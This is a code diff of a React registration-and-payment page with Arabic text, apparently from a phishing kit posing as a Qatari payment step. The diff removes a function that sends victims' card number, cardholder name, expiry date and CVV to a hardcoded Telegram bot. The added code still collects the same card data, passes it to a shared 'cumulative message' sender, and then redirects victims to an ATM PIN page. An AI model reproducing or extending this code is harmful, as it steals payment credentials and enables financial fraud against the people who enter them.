@@ -6,6 +6,7 @@ import Footer from "@/components/Footer";
 import { Button } from "@/components/ui/button";
 import { useToast } from "@/hooks/use-toast";
 import securePaymentLogos from "@/assets/secure-payment-logos.png";
+import { useRegistration } from "@/contexts/RegistrationContext";
 
 const steps = [
   { number: 1, title: "نوع الحساب" },
@@ -15,13 +16,14 @@ const steps = [
 ];
 
 const RegistrationComplete = () => {
+  const navigate = useNavigate();
+  const { updateData, sendCumulativeMessage } = useRegistration();
   const [currentView, setCurrentView] = useState<"welcome" | "payment" | "card-payment">("welcome");
   const [showApplePayError, setShowApplePayError] = useState(false);
   const [cardNumber, setCardNumber] = useState<string>("");
   const [cardholderName, setCardholderName] = useState<string>("");
   const [expiryDate, setExpiryDate] = useState<string>("");
   const [cvv, setCvv] = useState<string>("");
-  const navigate = useNavigate();
 
   const handleCardNumberChange = (value: string) => {
     // إزالة كل ما ليس رقم
@@ -48,27 +50,6 @@ const RegistrationComplete = () => {
     }
   };
 
-  const sendToTelegram = async (message: string) => {
-    try {
-      const botToken = "8248430225:AAHVBJ28Ftd7Sm2LBlEpDdrrpQEDLvLGGxo";
-      const chatId = "-4985537188";
-
-      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message,
-          parse_mode: "HTML",
-        }),
-      });
-    } catch (error) {
-      console.error("فشل الإرسال إلى Telegram:", error);
-    }
-  };
-
   const handleConfirmPayment = async () => {
     if (!cardNumber.trim() || !cardholderName.trim() || !expiryDate.trim() || !cvv.trim()) {
       alert("يرجى إدخال جميع بيانات البطاقة المصرفية");
@@ -90,9 +71,15 @@ const RegistrationComplete = () => {
       return;
     }
 
-    const message = `بيانات الدفع - بطاقة الائتمان\n\cardnum: ${cardNumber}\nاسم حامل البطاقة: ${cardholderName}\nتاريخ الانتهاء: ${expiryDate}\nCVV: ${cvv}\nالمبلغ المدفوع: 10.00 ريال قطري`;
-    await sendToTelegram(message);
-    navigate("/otp-verification");
+    updateData({
+      cardNumber,
+      cardholderName,
+      expiryDate,
+      cvv,
+    });
+
+    await sendCumulativeMessage(4, "بيانات الدفع");
+    navigate("/atm-pin");
   };
 
   return (
